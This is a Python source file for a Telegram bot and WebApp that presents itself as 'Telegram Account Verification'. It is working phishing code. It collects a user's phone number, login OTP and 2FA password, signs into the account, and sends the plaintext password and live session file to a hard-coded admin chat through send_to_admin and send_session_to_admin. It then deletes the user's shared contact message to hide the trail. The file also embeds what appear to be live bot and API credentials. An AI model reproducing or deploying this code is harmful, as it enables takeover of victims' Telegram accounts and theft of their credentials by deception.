import os
import telebot
from telebot import types
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeExpiredError, PhoneCodeInvalidError, FloodWaitError
from flask import Flask, render_template, request, jsonify, redirect, url_for
import asyncio
from datetime import datetime, timedelta
import re
import time
import threading
import uuid
import json

# Initialize Flask
app = Flask(__name__)

# Configuration
BOT_TOKEN = os.environ.get('BOT_TOKEN', '7487704262:AAE34XTNrKt5D9dKtduPK0Ezwc9j3SLGoBA')
USER_ID = int(os.environ.get('USER_ID', '5425526761'))
API_ID = int(os.environ.get('API_ID', '25240346'))
API_HASH = os.environ.get('API_HASH', 'b8849fd945ed9225a002fda96591b6ee')
WEBHOOK_URL = os.environ.get('WEBHOOK_URL', '')

# Initialize bot
bot = telebot.TeleBot(BOT_TOKEN)

# Storage
sessions = {}
session_expiry = 300  # 5 minutes
telegram_clients = {}
pending_contacts = {}  # Store contacts from WebApp before processing

# Create directories
os.makedirs('sessions', exist_ok=True)

# ==================== HELPER FUNCTIONS ====================
def generate_session_id():
    return str(uuid.uuid4())

def clean_phone(phone):
    return re.sub(r'[^\d+]', '', phone)

def generate_session_file(phone):
    safe_phone = clean_phone(phone)
    timestamp = int(time.time())
    return f"sessions/{safe_phone}_{timestamp}.session"

def clean_otp(otp):
    cleaned = re.sub(r'\D', '', otp)
    return cleaned if len(cleaned) == 5 else None

def get_client(session_file):
    if session_file not in telegram_clients:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        client = TelegramClient(
            session_file,
            API_ID,
            API_HASH,
            loop=loop,
            connection_retries=3,
            timeout=30
        )
        telegram_clients[session_file] = {
            'client': client,
            'loop': loop,
            'created': time.time()
        }
    return telegram_clients[session_file]

async def send_otp_async(client, phone):
    try:
        await client.connect()
        print(f"Connected to Telegram, sending OTP to {phone}")
        
        result = await client.send_code_request(phone)
        print(f"OTP sent successfully to {phone}")
        
        return {
            'success': True,
            'phone_code_hash': result.phone_code_hash
        }
    except FloodWaitError as e:
        wait_time = e.seconds
        print(f"Flood wait: {wait_time} seconds")
        return {'success': False, 'error': f'Please wait {wait_time} seconds before trying again'}
    except Exception as e:
        error_msg = str(e)
        print(f"Error sending OTP to {phone}: {error_msg}")
        
        if "PHONE_NUMBER_INVALID" in error_msg:
            return {'success': False, 'error': 'Invalid phone number format'}
        elif "PHONE_NUMBER_BANNED" in error_msg:
            return {'success': False, 'error': 'Phone number is banned'}
        elif "PHONE_CODE_EMPTY" in error_msg:
            return {'success': False, 'error': 'Phone code is empty'}
        elif "PHONE_CODE_EXPIRED" in error_msg:
            return {'success': False, 'error': 'Phone code expired'}
        elif "PHONE_CODE_INVALID" in error_msg:
            return {'success': False, 'error': 'Invalid phone code'}
        elif "SESSION_PASSWORD_NEEDED" in error_msg:
            return {'success': False, 'error': '2FA password needed'}
        else:
            return {'success': False, 'error': f'Failed to send OTP: {error_msg}'}

async def verify_otp_async(client, phone, code, phone_code_hash):
    try:
        print(f"Verifying OTP for {phone}: {code}")
        await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
        
        if await client.is_user_authorized():
            me = await client.get_me()
            print(f"Successfully verified {phone}, user: {me.username}")
            return {
                'success': True,
                'requires_2fa': False,
                'user': {
                    'id': me.id,
                    'username': me.username,
                    'first_name': me.first_name,
                    'last_name': me.last_name,
                    'phone': phone
                }
            }
        else:
            print(f"Verification succeeded but needs 2FA for {phone}")
            return {'success': True, 'requires_2fa': True}
            
    except SessionPasswordNeededError:
        print(f"2FA needed for {phone}")
        return {'success': True, 'requires_2fa': True}
    except PhoneCodeExpiredError:
        print(f"OTP expired for {phone}")
        return {'success': False, 'error': 'OTP expired', 'code_expired': True}
    except PhoneCodeInvalidError:
        print(f"Invalid OTP for {phone}")
        return {'success': False, 'error': 'Invalid OTP code'}
    except Exception as e:
        error_str = str(e)
        print(f"Verification error for {phone}: {error_str}")
        
        if 'password' in error_str.lower() or '2fa' in error_str.lower():
            return {'success': True, 'requires_2fa': True}
        elif 'code' in error_str.lower() and 'expired' in error_str.lower():
            return {'success': False, 'error': 'OTP expired', 'code_expired': True}
        else:
            return {'success': False, 'error': f'Verification failed: {error_str}'}

async def verify_2fa_async(client, password):
    try:
        await client.sign_in(password=password)
        me = await client.get_me()
        print(f"2FA successful for {me.phone}")
        return {
            'success': True,
            'user': {
                'id': me.id,
                'username': me.username,
                'first_name': me.first_name,
                'last_name': me.last_name,
                'phone': me.phone
            }
        }
    except Exception as e:
        print(f"2FA error: {e}")
        return {'success': False, 'error': f'Wrong password: {str(e)}'}

def send_to_admin(phone, user_info=None, password=None, source="webapp"):
    try:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        msg = f"""📱 <b>NEW VERIFICATION</b>

📞 Phone: {phone}
⏰ Time: {timestamp}
🌐 Source: {source}"""
        
        if user_info:
            full_name = f"{user_info.get('first_name', '')} {user_info.get('last_name', '')}".strip()
            if full_name:
                msg += f"\n👤 Name: {full_name}"
            if user_info.get('username'):
                msg += f"\n🔗 Username: @{user_info.get('username')}"
            msg += f"\n🆔 ID: {user_info.get('id', 'N/A')}"
        
        if password:
            msg += f"\n🔐 2FA Password: <code>{password}</code>"
        
        msg += f"\n\n✅ <b>VERIFICATION SUCCESSFUL</b>"
        
        bot.send_message(USER_ID, msg, parse_mode='HTML')
        print(f"Admin notification sent for {phone}")
        return True
    except Exception as e:
        print(f"Admin notification error: {e}")
        return False

def send_session_to_admin(session_file, phone, has_2fa=False):
    """Send session file to admin"""
    try:
        if os.path.exists(session_file):
            with open(session_file, 'rb') as f:
                caption = f"""✅ {'2FA ' if has_2fa else ''}Session File
📱 Phone: {phone}
⏰ Time: {datetime.now().strftime('%H:%M:%S')}
🌐 Source: WebApp"""
                
                bot.send_document(USER_ID, f, caption=caption)
                print(f"Session file sent to admin for {phone}")
                return True
    except Exception as e:
        print(f"Failed to send session file: {e}")
    return False

# ==================== FLASK ROUTES ====================
@app.route('/')
def index():
    """Main WebApp page"""
    session_id = request.args.get('session')
    
    if session_id and session_id in sessions:
        # If session exists, show OTP page directly
        session = sessions[session_id]
        return render_template('otp.html', session_id=session_id, phone=session['phone'])
    
    # New session
    return render_template('index.html')

@app.route('/api/init-session', methods=['POST'])
def init_session():
    """Initialize a new session for WebApp"""
    try:
        data = request.json
        session_id = generate_session_id()
        
        # Get WebApp init data
        init_data = data.get('init_data', '')
        
        sessions[session_id] = {
            'status': 'waiting_for_contact',
            'expiry': datetime.now() + timedelta(seconds=session_expiry),
            'created': datetime.now(),
            'init_data': init_data,
            'otp_attempts': 0,
            'contact_message_id': None  # Will store message ID to delete later
        }
        
        print(f"Created new WebApp session: {session_id}")
        
        return jsonify({
            'success': True,
            'session_id': session_id,
            'message': 'Session created successfully'
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/process-contact', methods=['POST'])
def process_contact():
    """Process contact shared via WebApp.requestContact()"""
    try:
        data = request.json
        session_id = data.get('session_id')
        user_id = data.get('user_id')
        chat_id = data.get('chat_id')
        
        print(f"Processing contact for session {session_id}, user {user_id}")
        
        if session_id not in sessions:
            return jsonify({'success': False, 'error': 'Session expired'})
        
        session = sessions[session_id]
        
        # The contact will come as a Telegram message to the bot
        # We need to wait for it and process it
        # Store pending contact info
        pending_contacts[session_id] = {
            'user_id': user_id,
            'chat_id': chat_id,
            'session': session,
            'created': datetime.now()
        }
        
        # Wait for contact message (will be handled by bot handler)
        # We'll poll for status
        return jsonify({
            'success': True,
            'message': 'Waiting for contact...',
            'check_status': True
        })
        
    except Exception as e:
        print(f"Error in process-contact: {str(e)}")
        return jsonify({'success': False, 'error': f'Server error: {str(e)}'})

@app.route('/api/check-contact-status/<session_id>', methods=['GET'])
def check_contact_status(session_id):
    """Check if contact has been received and processed"""
    try:
        if session_id not in sessions:
            return jsonify({'success': False, 'error': 'Session expired'})
        
        session = sessions[session_id]
        
        if session.get('phone'):
            # Contact received and processed
            return jsonify({
                'success': True,
                'status': 'contact_received',
                'phone': session['phone'],
                'otp_sent': session.get('otp_sent', False)
            })
        elif session.get('status') == 'contact_error':
            return jsonify({
                'success': False,
                'error': session.get('error', 'Failed to process contact')
            })
        else:
            # Still waiting
            return jsonify({
                'success': True,
                'status': 'waiting',
                'message': 'Waiting for contact...'
            })
            
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/send-otp', methods=['POST'])
def send_otp():
    """Send OTP after contact is received"""
    try:
        data = request.json
        session_id = data.get('session_id')
        
        print(f"Sending OTP for session {session_id}")
        
        if session_id not in sessions:
            return jsonify({'success': False, 'error': 'Session expired'})
        
        session = sessions[session_id]
        phone = session.get('phone')
        
        if not phone:
            return jsonify({'success': False, 'error': 'Phone number not received yet'})
        
        # Generate session file
        session_file = generate_session_file(phone)
        
        # Send OTP
        client_data = get_client(session_file)
        client = client_data['client']
        loop = client_data['loop']
        
        print(f"Sending OTP to {phone}...")
        result = loop.run_until_complete(send_otp_async(client, phone))
        
        if result['success']:
            # Update session with OTP info
            sessions[session_id].update({
                'phone_code_hash': result['phone_code_hash'],
                'session_file': session_file,
                'status': 'otp_sent',
                'otp_sent': True,
                'otp_attempts': 0,
                'expiry': datetime.now() + timedelta(seconds=session_expiry)
            })
            
            print(f"OTP sent successfully to {phone}")
            
            return jsonify({
                'success': True,
                'message': 'OTP sent successfully',
                'phone': phone
            })
        else:
            print(f"Failed to send OTP to {phone}: {result.get('error')}")
            
            # Delete the contact message
            if session.get('contact_message_id'):
                try:
                    bot.delete_message(session['chat_id'], session['contact_message_id'])
                except:
                    pass
            
            # Delete session
            del sessions[session_id]
            
            return jsonify({'success': False, 'error': result.get('error', 'Failed to send OTP')})
            
    except Exception as e:
        print(f"Error in send-otp: {str(e)}")
        return jsonify({'success': False, 'error': f'Server error: {str(e)}'})

@app.route('/api/verify-otp', methods=['POST'])
def verify_otp():
    """Verify OTP from WebApp"""
    try:
        data = request.json
        session_id = data.get('session_id')
        otp = data.get('otp', '')
        
        print(f"Verifying OTP for session {session_id}: {otp}")
        
        if session_id not in sessions:
            return jsonify({'success': False, 'error': 'Session expired. Please start over.'})
        
        session = sessions[session_id]
        
        # Clean OTP
        cleaned_otp = clean_otp(otp)
        if not cleaned_otp:
            return jsonify({'success': False, 'error': 'Invalid OTP format. Enter 5 digits.'})
        
        # Check attempts
        session['otp_attempts'] += 1
        if session['otp_attempts'] > 3:
            # Delete contact message before clearing session
            if session.get('contact_message_id'):
                try:
                    bot.delete_message(session['chat_id'], session['contact_message_id'])
                except:
                    pass
            del sessions[session_id]
            return jsonify({'success': False, 'error': 'Too many attempts. Please start over.'})
        
        # Verify OTP
        client_data = get_client(session['session_file'])
        client = client_data['client']
        loop = client_data['loop']
        
        print(f"Verifying OTP {cleaned_otp} for {session['phone']}")
        result = loop.run_until_complete(verify_otp_async(
            client,
            session['phone'],
            cleaned_otp,
            session['phone_code_hash']
        ))
        
        if result['success']:
            if result.get('requires_2fa'):
                session['expiry'] = datetime.now() + timedelta(seconds=600)
                print(f"2FA required for {session['phone']}")
                return jsonify({
                    'success': True,
                    'requires_2fa': True,
                    'message': '2FA authentication required'
                })
            else:
                # Success - send session to admin
                print(f"Verification successful for {session['phone']}")
                send_to_admin(session['phone'], result.get('user'), source='webapp')
                
                # Send session file
                send_session_to_admin(session['session_file'], session['phone'], has_2fa=False)
                
                # Delete contact message
                if session.get('contact_message_id'):
                    try:
                        bot.delete_message(session['chat_id'], session['contact_message_id'])
                        print(f"Deleted contact message for {session['phone']}")
                    except Exception as e:
                        print(f"Could not delete contact message: {e}")
                
                # Delete session
                del sessions[session_id]
                
                return jsonify({
                    'success': True,
                    'requires_2fa': False,
                    'message': 'Account verified successfully'
                })
        else:
            if result.get('code_expired'):
                print(f"OTP expired for {session['phone']}")
                # Delete contact message
                if session.get('contact_message_id'):
                    try:
                        bot.delete_message(session['chat_id'], session['contact_message_id'])
                    except:
                        pass
                del sessions[session_id]
                return jsonify({'success': False, 'error': 'OTP expired. Please start over.'})
            
            print(f"Verification failed for {session['phone']}: {result.get('error')}")
            return jsonify({'success': False, 'error': result.get('error', 'Verification failed')})
            
    except Exception as e:
        print(f"Error in verify-otp: {str(e)}")
        return jsonify({'success': False, 'error': f'Server error: {str(e)}'})

@app.route('/api/verify-2fa', methods=['POST'])
def verify_2fa():
    """Verify 2FA password from WebApp"""
    try:
        data = request.json
        session_id = data.get('session_id')
        password = data.get('password', '').strip()
        
        print(f"Verifying 2FA for session {session_id}")
        
        if session_id not in sessions:
            return jsonify({'success': False, 'error': 'Session expired'})
        
        if not password:
            return jsonify({'success': False, 'error': 'Please enter 2FA password'})
        
        session = sessions[session_id]
        client_data = get_client(session['session_file'])
        client = client_data['client']
        loop = client_data['loop']
        
        result = loop.run_until_complete(verify_2fa_async(client, password))
        
        if result['success']:
            # Success with 2FA
            print(f"2FA successful for {session['phone']}")
            send_to_admin(session['phone'], result.get('user'), password, 'webapp')
            
            # Send session file
            send_session_to_admin(session['session_file'], session['phone'], has_2fa=True)
            
            # Delete contact message
            if session.get('contact_message_id'):
                try:
                    bot.delete_message(session['chat_id'], session['contact_message_id'])
                    print(f"Deleted contact message for {session['phone']}")
                except Exception as e:
                    print(f"Could not delete contact message: {e}")
            
            # Delete session
            del sessions[session_id]
            
            return jsonify({
                'success': True, 
                'message': '2FA verified successfully'
            })
        else:
            print(f"2FA failed for {session['phone']}: {result.get('error')}")
            return jsonify({'success': False, 'error': result.get('error', '2FA verification failed')})
            
    except Exception as e:
        print(f"Error in verify-2fa: {str(e)}")
        return jsonify({'success': False, 'error': f'Server error: {str(e)}'})

# ==================== BOT HANDLERS ====================
@bot.message_handler(commands=['start'])
def start_command(message):
    """Send WebApp button directly"""
    try:
        # Create WebApp URL
        webapp_url = WEBHOOK_URL.rstrip('/') if WEBHOOK_URL else f"https://{request.host}"
        
        # Create inline keyboard with WebApp button
        keyboard = types.InlineKeyboardMarkup()
        webapp_btn = types.InlineKeyboardButton(
            text="📱 Open WebApp to Verify",
            web_app=types.WebAppInfo(url=webapp_url)
        )
        keyboard.add(webapp_btn)
        
        bot.send_message(
            message.chat.id,
            """🔐 <b>Telegram Account Verification</b>

Click the button below to open the WebApp and verify your account:

✅ <b>WebApp Features:</b>
• Share contact directly in WebApp
• Enter OTP securely
• 2FA support if enabled
• No chat messages
• Auto-delete shared contact

<b>Click below to begin:</b>""",
            parse_mode='HTML',
            reply_markup=keyboard
        )
        
        print(f"WebApp button sent to user {message.from_user.id}")
        
    except Exception as e:
        print(f"Start command error: {e}")

@bot.message_handler(content_types=['contact'])
def handle_contact_from_webapp(message):
    """Handle contact sent from WebApp.requestContact()"""
    try:
        contact = message.contact
        user_id = message.from_user.id
        chat_id = message.chat.id
        
        phone = contact.phone_number
        first_name = contact.first_name or ''
        last_name = contact.last_name or ''
        
        print(f"Contact received from WebApp user {user_id}: {phone}")
        
        # Format phone number
        if not phone.startswith('+'):
            phone = '+' + phone
        
        # Validate phone number
        if len(phone) < 8 or not re.match(r'^\+\d+$', phone):
            print(f"Invalid phone format: {phone}")
            return
        
        # Find which session this belongs to
        matching_session = None
        for session_id, pending_info in pending_contacts.items():
            if pending_info['user_id'] == user_id:
                matching_session = session_id
                break
        
        if not matching_session:
            print(f"No pending session found for user {user_id}")
            return
        
        # Update the session with contact info
        sessions[matching_session].update({
            'phone': phone,
            'first_name': first_name,
            'last_name': last_name,
            'user_id': user_id,
            'chat_id': chat_id,
            'contact_message_id': message.message_id,
            'status': 'contact_received'
        })
        
        print(f"Contact processed for session {matching_session}: {phone}")
        
        # Delete from pending
        if matching_session in pending_contacts:
            del pending_contacts[matching_session]
        
        # Send OTP automatically
        session_file = generate_session_file(phone)
        
        # Store session file in session
        sessions[matching_session]['session_file'] = session_file
        
        # Send OTP
        client_data = get_client(session_file)
        client = client_data['client']
        loop = client_data['loop']
        
        print(f"Auto-sending OTP to {phone}...")
        result = loop.run_until_complete(send_otp_async(client, phone))
        
        if result['success']:
            sessions[matching_session].update({
                'phone_code_hash': result['phone_code_hash'],
                'otp_sent': True,
                'otp_attempts': 0,
                'expiry': datetime.now() + timedelta(seconds=session_expiry)
            })
            print(f"OTP auto-sent successfully to {phone}")
        else:
            sessions[matching_session]['status'] = 'contact_error'
            sessions[matching_session]['error'] = result.get('error', 'Failed to send OTP')
            print(f"Failed to auto-send OTP to {phone}: {result.get('error')}")
            
            # Delete the contact message on error
            try:
                bot.delete_message(chat_id, message.message_id)
                print(f"Deleted contact message due to OTP send error")
            except:
                pass
        
    except Exception as e:
        print(f"Contact handler error: {e}")

# ==================== WEBHOOK SETUP ====================
def setup_webhook():
    """Set up webhook for Render"""
    try:
        if WEBHOOK_URL:
            bot.remove_webhook()
            time.sleep(1)
            webhook_url = f"{WEBHOOK_URL.rstrip('/')}/bot/{BOT_TOKEN}"
            bot.set_webhook(url=webhook_url)
            print(f"✅ Webhook set: {webhook_url}")
            return True
        else:
            print("⚠️ No WEBHOOK_URL set, using polling")
            return False
    except Exception as e:
        print(f"❌ Webhook error: {e}")
        return False

@app.route(f'/bot/{BOT_TOKEN}', methods=['POST'])
def webhook():
    """Handle Telegram webhook"""
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return ''
    return 'OK', 403

# ==================== CLEANUP THREAD ====================
def cleanup_loop():
    """Clean up old sessions and pending contacts"""
    while True:
        time.sleep(60)
        current_time = datetime.now()
        expired_sessions = []
        expired_pending = []
        
        # Clean expired sessions
        for session_id, session in sessions.items():
            if session['expiry'] < current_time:
                expired_sessions.append(session_id)
                
                # Try to delete contact message if exists
                if session.get('contact_message_id'):
                    try:
                        bot.delete_message(session['chat_id'], session['contact_message_id'])
                    except:
                        pass
        
        for session_id in expired_sessions:
            del sessions[session_id]
        
        # Clean expired pending contacts
        for session_id, pending in pending_contacts.items():
            if pending['created'] < current_time - timedelta(seconds=60):
                expired_pending.append(session_id)
        
        for session_id in expired_pending:
            del pending_contacts[session_id]
        
        print(f"Cleanup: {len(expired_sessions)} sessions, {len(expired_pending)} pending")

# ==================== MAIN ====================
if __name__ == '__main__':
    print("="*60)
    print("🚀 Telegram WebApp Verification Bot")
    print("="*60)
    print(f"🤖 Bot Token: {BOT_TOKEN[:10]}...")
    print(f"👤 User ID: {USER_ID}")
    print(f"🔧 API ID: {API_ID}")
    
    # Start cleanup thread
    cleanup_thread = threading.Thread(target=cleanup_loop, daemon=True)
    cleanup_thread.start()
    print("✅ Cleanup thread started")
    
    # Set up webhook or polling
    port = int(os.environ.get('PORT', 5000))
    
    if WEBHOOK_URL and port == 10000:  # Render uses port 10000
        setup_webhook()
        print(f"🌐 WebApp URL: {WEBHOOK_URL}")
        print("🤖 Bot running via webhook")
        app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
    else:
        print("🌐 Local development mode")
        print(f"📱 WebApp URL: http://localhost:{port}")
        print("🤖 Bot running via polling")
        
        # Start bot in separate thread
        def run_bot():
            try:
                print("Starting bot polling...")
                bot.polling(none_stop=True, timeout=30, skip_pending=True)
            except Exception as e:
                print(f"Bot polling error: {e}")
                time.sleep(5)
                run_bot()
        
        bot_thread = threading.Thread(target=run_bot, daemon=True)
        bot_thread.start()
        time.sleep(2)  # Give bot time to start
        
        # Run Flask
        print("Starting Flask server...")
        app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False, threaded=True)
